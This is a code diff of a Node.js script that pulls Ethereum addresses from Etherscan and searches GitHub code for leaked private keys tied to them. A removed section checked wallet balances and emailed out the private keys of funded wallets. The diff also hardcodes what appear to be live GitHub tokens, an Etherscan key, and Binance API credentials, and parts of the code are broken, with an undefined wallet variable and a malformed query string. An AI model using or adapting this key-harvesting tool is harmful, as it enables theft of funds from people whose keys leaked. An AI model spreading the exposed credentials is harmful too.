@@ -7,14 +7,22 @@ const Promise = require("bluebird")
 const { throttling } = require("@octokit/plugin-throttling");
 const { retry } = require("@octokit/plugin-retry");
 const names = require('./names.json')
-const gitApiKey = "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"
+const gitApiKey = "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"
 //const gitApiKey = "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"
 const etherscanApiKey = "KIP9EMNW2G9Y23TPCS21H6JGD6I9I2WW7T"
+const ccxt = require("ccxt")
+const BINANCE_API_KEY="8PDfQ2lSIyHPWdNAHNIaIoNy3MiiMuvgwYADbmtsKo867B0xnIhIGjPULsOtvMRk"
+const BINANCE_API_KEY_SECRET="tbUiyZ94l0zpYOlKs3eO1dvLNMOSbOb2T1T0eT0I1eogH9Fh8Htvli05eZ1iDvra"
 const etherscanAPI = require("etherscan-api").init(etherscanApiKey)
+
+const exchange = new ccxt.binance({apiKey: BINANCE_API_KEY, secret: BINANCE_API_KEY_SECRET})
+
+exchange.fetchBalance().then(console.log)
 let MyOcto = Octokit.plugin(
   throttling,
   retry
 )
+
  const octo = new MyOcto({
   auth: gitApiKey, 
   throttle: {
@@ -40,16 +48,20 @@ const getBlock = async () => {
 }
 
 const searchForPrivKeysViaEtherscan = async (address, page) => {
-       let transactions = await etherscanAPI.account.txlist('0x8d12A197cB00D4747a1fe03395095ce2A5CC6819', 1, 'latest', 1, 100, 'asc')
-  let addresses = new Set(transactions.result.map(item => [item.from, item.to]).reduce((a,b)=> [...a,...b]))
-  
-  return Promise.map(addresses, async address => {
-         let query = 'privateKey ${address}'
+       const blockNumber = await etherscanAPI.proxy.eth_blockNumber()
+  const block = await etherscanAPI.proxy.eth_getBlockByNumber(blockNumber.result)
+	let transactions = block.result.transactions
+	let addresses = new Set(transactions.map(item => [item.from, item.to]).reduce((a,b)=> [...a,...b]))
+	addresses = Array.from(addresses)
+     
+  return Promise.each(addresses, async address => {
+         let query = 'priv '+ address
       setTimeout(() => {
           octo.rest.search.code({q:query, order:"asc", sort: "indexed", page, per_page:100}).then(res => {
          let items = res.data.items
             console.log(address, items.length)
-         return items.map(async item=> {
+         return Promise.each(items, async item=> {
+		//console.log(item)
            try {
             const content = await octo.rest.git.getBlob({
               owner: item.repository.owner.login,
@@ -70,9 +82,7 @@ const searchForPrivKeysViaEtherscan = async (address, page) => {
           }
            
          })
-            
-      }).catch(err => err)
-     
+	  })    
        }, 50)
     })
   }
@@ -128,7 +138,7 @@ const searchProfilesForPrivateKeys = async (page, name, per_page) => {
 
   const searchForPrivKeysViaGithub = async (page) => {
     
-    let query = 'priv CORE'
+    let query = ''
       setTimeout(() => {
           octo.rest.search.code({q:query, order:"asc", sort: "indexed", page, per_page:30}).then(async res => {
          let items = res.data.items
@@ -156,13 +166,9 @@ const searchProfilesForPrivateKeys = async (page, name, per_page) => {
     
   } 
   
-  for(let i=0; i< 10; i++) {
-    searchForPrivKeysViaGithub(i)
-    
-  }
 
 //searchPrivKeysViaEtherscan()
-// searchForPrivKeysViaEtherscan()
+//searchForPrivKeysViaEtherscan()
 
 
 
@@ -172,31 +178,12 @@ const testAddress = "0xd83eB40979cA0Dabe945E22629A72765dc9A39bD"
 //testPrivateKeys(["9cf3e34444a91a01307eb7a50210aa8a3faacb8dcbfb3435d2acbca9765f4460"])
 
 
-//searchForPrivKeysViaGithub(testAddress, page)
+//searchForPrivKeysViaGithub(1)
 
 
 
 let network = "rinkeby"
 
-const start = async () => {
-   const provider = ethers2.getDefaultProvider()
-while(true){
- 
- // let initialWallet = ethers2.Wallet.
-  let privateKey = initialWallet.privateKey
-  //console.log(provider)
-  //console.log(privateKey)
-  //console.log(initialWallet.address)
-  //console.log(provider)
-  const balance = await provider.getBalance(initialWallet.address)
-  if(balance > 0) {
-    console.log(balance, privateKey)
-    const {address}= wallet
-    const {privateKey} = wallet
-    sendEmail(balance, privateKey, address)
-  }
-}
-}
 //start()
 //getBlock().then(console.log)
 //console.log("got block number", block)
